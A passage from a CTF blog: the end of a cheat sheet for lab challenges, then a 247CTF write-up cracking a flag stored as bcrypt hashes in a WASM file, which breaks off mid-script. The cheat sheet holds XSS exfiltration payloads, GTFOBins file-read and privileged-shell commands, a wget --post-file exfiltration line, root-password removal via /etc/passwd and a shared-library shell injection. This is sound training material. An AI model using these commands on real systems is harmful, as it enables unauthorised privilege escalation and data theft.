+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Manual GET request via nc</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;GET / HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n&quot;</span> | nc localhost 80</span><br><span class="line"></span><br><span class="line"><span class="comment"># Simple GET via curl</span></span><br><span class="line">curl -X GET <span class="string">&quot;http://localhost/&quot;</span></span><br></pre></td></tr></table></figure>
+<h3 id="custom-headers">2.2 Custom Headers</h3>
+<p>Setting the <code>Host</code> header for different tasks.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Task: Host: root-me.org</span></span><br><span class="line">curl -X GET http://localhost/task -H <span class="string">&quot;Host: root-me.org&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Task: Host: net-force.nl:80</span></span><br><span class="line">curl -v -X GET http://localhost/gate -H <span class="string">&quot;Host: net-force.nl:80&quot;</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;GET /gate HTTP/1.1\r\nHost: net-force.nl:80\r\nConnection: close\r\n\r\n&quot;</span> | nc localhost 80</span><br></pre></td></tr></table></figure>
+<h3 id="url-encoding-query-parameters">2.3 URL Encoding &amp; Query
+Parameters</h3>
+<p>Handling spaces and multiple parameters.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># URL Encoded Path: /progress%20request%20qualify</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;%b&quot;</span> <span class="string">&quot;GET /progress%20request%20qualify HTTP/1.1\r\nHost: challenge.localhost:80\r\nConnection: close\r\n\r\n&quot;</span> | nc localhost 80</span><br><span class="line"></span><br><span class="line"><span class="comment"># Query Strings</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;%b&quot;</span> <span class="string">&quot;GET /mission?hash=crwtzkzq HTTP/1.1\r\nHost: challenge.localhost:80\r\nConnection: close\r\n\r\n&quot;</span> | nc localhost 80</span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;%b&quot;</span> <span class="string">&quot;GET /request?access=ejnskvxx&amp;token=rmxwpdzo&amp;signature=fhhmtasz HTTP/1.1\r\nHost: challenge.localhost:80\r\nConnection: close\r\n\r\n&quot;</span> | nc localhost 80</span><br><span class="line">curl -X GET <span class="string">&quot;http://localhost/hack?pass=fjawumxb&amp;security_token=yaanpzkj&amp;security=xufooqmp&quot;</span> -H <span class="string">&quot;Host: challenge.localhost:80&quot;</span></span><br></pre></td></tr></table></figure>
+<h3 id="post-requests">2.4 POST Requests</h3>
+<p>Submitting data via
+<code>application/x-www-form-urlencoded</code>.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Manual POST via nc</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;%b&quot;</span> <span class="string">&quot;POST /complete HTTP/1.1\r\nHost: challenge.localhost:80\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 22\r\nConnection: close\r\n\r\nchallenge_key=ocgzmivl&quot;</span> | nc localhost 80</span><br><span class="line"></span><br><span class="line"><span class="comment"># POST via curl</span></span><br><span class="line">curl -X POST <span class="string">&quot;http://localhost/hack&quot;</span> -H <span class="string">&quot;Host: challenge.localhost:80&quot;</span> -d <span class="string">&quot;token=ieovmiim&amp;authcode=dhcrcdvp&amp;access=cbmupwsi&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Complex POST via nc</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;%b&quot;</span> <span class="string">&quot;POST /verify HTTP/1.1\r\nHost: challenge.localhost:80\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 74\r\nConnection: close\r\n\r\nsecure_key=rxwoveec&amp;security=yyiezfbi&amp;pass=oufnsrdp&amp;challenge_key=menvugmn&quot;</span> | nc localhost 80</span><br></pre></td></tr></table></figure>
+<h3 id="cookies-state-management">2.5 Cookies &amp; State
+Management</h3>
+<p>Managing session data.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Save and send cookies with curl</span></span><br><span class="line">curl -c cookies.txt -b cookies.txt -L http://localhost/</span><br><span class="line"></span><br><span class="line"><span class="comment"># Manual Cookie Header</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;%b&quot;</span> <span class="string">&quot;GET / HTTP/1.1\r\nHost: localhost\r\nCookie: cookie=6136b40d5c4af043f373b9f786ce3d30\r\nConnection: close\r\n\r\n&quot;</span> | nc localhost 80</span><br></pre></td></tr></table></figure>
+<h3 id="redirects">2.6 Redirects</h3>
+<p>Following HTTP 302 redirects.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Manual handling (checking Location header)</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;%b&quot;</span> <span class="string">&quot;GET / HTTP/1.1\r\nHost: challenge.localhost:80\r\nConnection: close\r\n\r\n&quot;</span> | nc localhost 80</span><br><span class="line"></span><br><span class="line"><span class="comment"># Automated redirect following</span></span><br><span class="line">curl -L -X GET <span class="string">&quot;http://localhost/&quot;</span> -H <span class="string">&quot;Host: challenge.localhost:80&quot;</span></span><br></pre></td></tr></table></figure>
+<h3 id="client-side-redirection-xss-style-exfiltration">2.7 Client-Side
+Redirection &amp; XSS-style Exfiltration</h3>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Simple JS redirect</span></span><br><span class="line">echo <span class="string">&#x27;&lt;script&gt;window.location = &quot;/check&quot;;&lt;/script&gt;&#x27;</span> &gt; ~<span class="regexp">/public_html/</span>solve.<span class="property">html</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Data Exfiltration via URL</span></span><br><span class="line">echo <span class="string">&#x27;&lt;script src=&quot;/submit&quot;&gt;&lt;/script&gt;&lt;script&gt;window.location=&quot;http://localhost:1337/?stolen=&quot;+flag;&lt;/script&gt;&#x27;</span> &gt; ~<span class="regexp">/public_html/</span>solve.<span class="property">html</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Exfiltration using Fetch</span></span><br><span class="line">echo <span class="string">&#x27;&lt;script&gt;fetch(&quot;/gateway&quot;).then(r=&gt;r.text()).then(d=&gt;window.location=&quot;http://localhost:1337/?stolen=&quot;+d);&lt;/script&gt;&#x27;</span> &gt; ~<span class="regexp">/public_html/</span>solve.<span class="property">html</span></span><br></pre></td></tr></table></figure>
+<h2 id="program-misuse-gtfobins">3. Program Misuse (GTFOBins)</h2>
+<p>Techniques for reading restricted files (like <code>/flag</code>) via
+unexpected program behavior.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Compressed formats</span></span><br><span class="line">gzip -c /flag | gzip -d</span><br><span class="line">bzip2 -c /flag | bzip2 -d</span><br><span class="line">zip -c /flag | zip -d</span><br><span class="line">tar -cO /flag | tar -xO</span><br><span class="line"></span><br><span class="line"><span class="comment"># Archive tools</span></span><br><span class="line">ar r pwned.a /flag &amp;&amp; ar p pwned.a</span><br><span class="line"><span class="built_in">echo</span> /flag | cpio -o</span><br><span class="line"></span><br><span class="line"><span class="comment"># Shell/Execution wrappers</span></span><br><span class="line"><span class="built_in">env</span> /bin/sh -p</span><br><span class="line"><span class="built_in">nice</span> /bin/sh -p</span><br><span class="line"><span class="built_in">timeout</span> 0 /bin/sh -p</span><br><span class="line">setarch $(<span class="built_in">arch</span>) /bin/sh -p</span><br><span class="line">socat - <span class="string">&#x27;exec:/bin/sh -p,pty,ctty,raw,echo=0&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Text processing / viewing</span></span><br><span class="line">find /flag -<span class="built_in">exec</span> <span class="built_in">cat</span> &#123;&#125; \;</span><br><span class="line">mawk <span class="string">&#x27;//&#x27;</span> /flag</span><br><span class="line">sed <span class="string">&#x27;&#x27;</span> /flag</span><br><span class="line">whiptail --textbox --scrolltext /flag 50 100</span><br><span class="line">ed /flag <span class="comment"># Use &#x27;,p&#x27; to print, &#x27;q&#x27; to quit</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Language Interpreters</span></span><br><span class="line">perl -ne <span class="built_in">print</span> /flag</span><br><span class="line">python -c <span class="string">&#x27;import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#x27;</span></span><br><span class="line">ruby -e <span class="string">&#x27;puts File.read(&quot;/flag&quot;)&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Miscellaneous</span></span><br><span class="line"><span class="built_in">cp</span> /flag &gt; /dev/stdout</span><br><span class="line"><span class="built_in">date</span> -f /flag</span><br><span class="line">dmesg -rF /flag</span><br><span class="line"><span class="built_in">wc</span> --files0-from /flag</span><br><span class="line">gcc -x c -E /flag</span><br><span class="line">as @/flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># Network tools</span></span><br><span class="line">nc -lp 1337 &amp; wget --post-file=/flag http://127.0.0.1:1337/</span><br></pre></td></tr></table></figure>
+<h3 id="privilege-escalation-tricks">3.1 Privilege Escalation
+Tricks</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Changing permissions/ownership</span></span><br><span class="line"><span class="built_in">chown</span> $(<span class="built_in">id</span> -un):$(<span class="built_in">id</span> -gn) /flag</span><br><span class="line"><span class="built_in">chmod</span> 777 /flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># Shadowing root password</span></span><br><span class="line"><span class="built_in">cp</span> /etc/passwd ./hack_passwd</span><br><span class="line">sed -i <span class="string">&#x27;s/^root:x:/root::/&#x27;</span> ./hack_passwd</span><br><span class="line"><span class="built_in">mv</span> ./hack_passwd /etc/passwd</span><br><span class="line">su root</span><br><span class="line"></span><br><span class="line"><span class="comment"># Shared Library Injection</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="string">void C_GetFunctionList() &#123;&#125;</span></span><br><span class="line"><span class="string">void __attribute__((constructor)) init() &#123;</span></span><br><span class="line"><span class="string">    execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;, NULL);</span></span><br><span class="line"><span class="string">&#125;&#x27;</span> | gcc -w -fPIC -shared -o lib.so -x c -</span><br><span class="line">/challenge/ssh-keygen -D ./lib.so</span><br></pre></td></tr></table></figure>
+<h2 id="sql-injection-basics">4. SQL Injection Basics</h2>
+<h3 id="simple-selects">4.1 Simple Selects</h3>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- Select all logs</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> logs;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Filter by ID/Tag</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> entries <span class="keyword">WHERE</span> flag_tag <span class="operator">=</span> <span class="number">1337</span>;</span><br><span class="line"><span class="keyword">SELECT</span> resource <span class="keyword">FROM</span> flags <span class="keyword">WHERE</span> flag_tag <span class="operator">!=</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+<h3 id="pattern-matching-string-manipulation">4.2 Pattern Matching &amp;
+String Manipulation</h3>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- LIKE operator</span></span><br><span class="line"><span class="keyword">SELECT</span> detail <span class="keyword">FROM</span> payloads <span class="keyword">WHERE</span> flag_tag <span class="keyword">LIKE</span> &quot;yep&quot;;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Substring matching</span></span><br><span class="line"><span class="keyword">SELECT</span> detail <span class="keyword">FROM</span> items <span class="keyword">WHERE</span> substr(detail, <span class="number">1</span>, <span class="number">3</span>) <span class="operator">=</span> <span class="string">&#x27;pwn&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Complex substring extraction (brute-forcing length)</span></span><br><span class="line"><span class="keyword">SELECT</span> substr(secret, <span class="number">1</span>, <span class="number">5</span>), substr(secret, <span class="number">6</span>, <span class="number">5</span>) <span class="keyword">FROM</span> items;</span><br></pre></td></tr></table></figure>
+<h3 id="database-schema-exploration">4.3 Database Schema
+Exploration</h3>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- List tables in SQLite</span></span><br><span class="line"><span class="keyword">SELECT</span> name <span class="keyword">FROM</span> sqlite_master <span class="keyword">WHERE</span> type<span class="operator">=</span><span class="string">&#x27;table&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Querying found tables</span></span><br><span class="line"><span class="keyword">SELECT</span> flag <span class="keyword">FROM</span> UgRKNxaq;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/247CTF/247CTF-the-flag-safe/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/247CTF/247CTF-the-flag-safe/" class="post-title-link" itemprop="url">247CTF - The Flag Safe</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-03-10 23:22:29 / Modified: 23:23:09" itemprop="dateCreated datePublished" datetime="2026-03-10T23:22:29+08:00">2026-03-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/247CTF/247CTF-the-flag-safe/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/247CTF/247CTF-the-flag-safe/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <blockquote>
+<p>A secret flag is safely hidden away within client-side scripts. We
+were told JavaScript is an insecure medium for secret storage, so we
+decided to use C++ instead.</p>
+</blockquote>
+<h3 id="analysis">Analysis</h3>
+<p>I use radare2 BTW</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">❯ r2 flag.wasm</span><br><span class="line">[0x0000019a]&gt; iE</span><br><span class="line">[Exports]</span><br><span class="line"><span class="comment"># ... key functions ...</span></span><br><span class="line">137 0x0000a343 0x0000a343 GLOBAL FUNC 12 CompareFlag</span><br><span class="line">138 0x0000a34f 0x0000a34f GLOBAL FUNC 17 CompareFlagIndex</span><br><span class="line"></span><br><span class="line">[0x0000019a]&gt; iz</span><br><span class="line">[Strings]</span><br><span class="line">nth paddr      vaddr      len size section <span class="built_in">type</span>  string</span><br><span class="line">―――――――――――――――――――――――――――――――――――――――――――――――――――――――</span><br><span class="line">92  0x000098d9 0x000098d9 24  25   data    ascii OrpheanBeholderScryDoubt</span><br><span class="line">96  0x00009979 0x00009979 64  65   data    ascii ./ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789</span><br><span class="line">97  0x000099ba 0x000099ba 60  61   data    ascii $2b$12<span class="variable">$uAfq9EI1EoIC316VgA3azeOyogkKzG4zz2kF8M</span>.l.D4h4nT4WsidK</span><br><span class="line">98  0x000099f7 0x000099f7 60  61   data    ascii $2b$12<span class="variable">$NmhDm</span>/LZzjanlv6xuHCsVe8JJNlvEb3uYUEQ03abPIlCuTE6qtrT.</span><br><span class="line"><span class="comment"># ... 40 hashes total ...</span></span><br></pre></td></tr></table></figure>
+<p>Obviously the flag is stored as a series of bcrypt hashes, which are
+all prefixed with <code>$2b$12$</code>.</p>
+<h3 id="cracking-the-flag">Cracking the Flag</h3>
+<p>If we test single characters, we can see that the flag start with 2,
+but the next character is unknown.</p>
+<p>Since the hashes are cumulative, each one validates the entire flag
+prefix up to that point. We can recover the flag by brute-forcing each
+character in sequence and appending it to the previously discovered
+string.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> bcrypt</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">hashes = [</span><br><span class="line">    <span class="string">b&quot;$2b$12$uAfq9EI1EoIC316VgA3azeOyogkKzG4zz2kF8M.l.D4h4nT4WsidK&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$NmhDm/LZzjanlv6xuHCsVe8JJNlvEb3uYUEQ03abPIlCuTE6qtrT.&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$8OhK6ZPoSuBujRxR3pz4g.vp6LvTqJe/NJZZHTHtOPkdIbDb1GDKS&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$PhFiPd28yDeXdZaJfUDjTOiAUQtpBJ2AjD5pFIG7CtUXQtWECGpre&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$DfQJicmUWZQ0EVGKxdQEN.yCj3s4o6GyMraqt514d3DRkAqH8PYq6&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$JikQohCsuFN6DO7q9ZHCTeHuzL3/Hb3diMYJsUGgAI4AH64x9jtyO&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$4C2jJ0QxCKdqyrBTIhqEGeeq1IMOZJs7DllwqtMWbp.rM7BPsbDwG&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$FI45z3VbyCC4Bb5rVJsLb./Od6aSnT8tHIPkwmZCgGNNrXwpJqkO6&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$tFkj/QdzBVsk8XjjjH91eefYY/lx6YX/4lnB9T/GKSIvpmx7mEEG2&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$Il.BDj/qxIkgROEZN4/Te.QJawuPW18MHU1hVQzNIC9SW7H.Mo9.2&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$3UOGifrFe0iGGh4sSWx1JeB919LDApovzwbYIQqniIFVE3/mgEFkW&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$5voYYJHxGJVy3ITneNhk/.XbcfOKDDnMHiS2CTri0ncFQ/jUgND.e&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$cDvS2AqrJ72gvUP5wSnjSOqdsFIKcsGI863NxXgdedYzMV0YzOZmW&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$pIcJfpN7L0SGQtA/4bcX.ewqrSkeUzCeq4mrjHCzhwQKB2LTc4tJe&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$4xjImCcvXpgG.WFwjlryEONm4gFy3/O2VSCsrL1lX38f0XDPKc6Hm&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$gIWlY5GubfJ1kIhMEO9GnuTbalD8aPc6ECdNIq.4Vjx6S38nKLG8S&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$9UpsAlXYVpPw4B93u2WBm.Ve0JMqdkQ0wxvuAPqnXmtzjmvXm0hea&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$QqTL8meoLdWMnipKwuRoC.d9ei6TU2ev1Ggu0VsC2gLGMfF7QWOPi&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$8M.Z95IrSP64adu2LiOhzO4vhtmfjBx45Pp.FJsq4Tqe/t5GaPeA2&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$GNWfLovpvpMcoK89QdZzt.u8XibRtwo0aFFnUSBcqs0SjocL6hgVS&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$mLzTYglkEg3iqusfz8lOOuH548ezA.mgfr8pYI7cd3ozU8aPJBhAC&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$6GTg.qAyDUQorM1BwcIXRe7Ab.L3ZXqJhI0xg2G.OtCVf5W1BH7zu&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$Nxd1aKxcgV4s51dN5nc2puAtG8J6asT8vcvB0kfWhcfYp868nza7.&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$Z2/4n8JEXI19ZFL7A4ojEOiSbfAeV3KZj5Nc0.Uu6sXG6KHvtPCLi&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$AEiJfo2eTPnTCU.NL2jJeOifcw/TOAZaOLjMAPKEdfJmgdQy/WoYC&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$8pA4oDi3uovODvOuf2GrteqltIOhDUH/AI07H1NrvCoA5AvL9vKJe&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$Kke80penOJ8l7/EBoDZCWufdwdWju/Twb6.9DSm498.I922qNBfBK&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$xOcqWzPSMN3VgbsmEmZbYe98NBK1Qxpp6fAZNYCEiU/Lw5vsbIOz.&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$OnXeQsiQyBpIZzciVGSkUuBwcr62OoirL8Ebb9QczH7AAFdIsrbxi&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$3c8V9ss5ATsQkkz0ZUg2T.x0qCBszvuetJPX.vm9XPgsGBwhedfhy&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$xVrrb1qPs3mHX2kp6vo10e8zsUqDxXxlmptJnFBT/5YVDeSGAJsty&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$BA5vnPd.oxWN4BEn6PybEeXgWYrX02k9rHXLnDAiDedUilCuiv2jy&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$7p6s4NoKXsjqD/0wnuO2b.2ux70dPNcN5wBYccuzz8vm1ZZ9iPPLu&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$oXuFS3O5Td3knq2gRyf5XOhwj1.IYOWQ9fSvGY05YU0MwizIm18Ru&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$l3wvb/fiYbkzoqWv1.ulMuQPTn6xP67D0/YkjNzwJi1bK30qJAZWu&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$3eFpVZJh6TfrnbE.hdfitu8UiqLei7u2vEjFPecu6O5FqNqyOYOs.&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$XtrkQGAyvRcIdCtW4AK9/.9oSlP2rAwE.KNk5f2sKuyhhDNzIAvzC&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$zrsIpC4WnPVjcCRODlRXT.IDPIZwBEP2VwTv.q5/DIfCpdD44zoam&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$Lr3UiwLPab6yEw.TERhNAu1/qlQelYuqmF/Wcg3UtrzslAzrf3/di&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;$2b$12$RtpdIcXU8hH8pnDGQHCupu5l2mw872X6SFamb20w9A.sieVEk7Xba&quot;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">charset = string.printable.strip()</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, h <span class="keyword">in</span> <span class="built_in">enumerate</span>(hashes):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Cracking index <span class="subst">&#123;i:2d&#125;</span>... &quot;</span>, end=<span class="string">&quot;&quot;</span>, flush=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> charset:</span><br><span class="line">        <span class="keyword">if</span> bcrypt.checkpw((flag + c).encode(), h):</span><br><span class="line">            flag += c</span><br><span class="line">            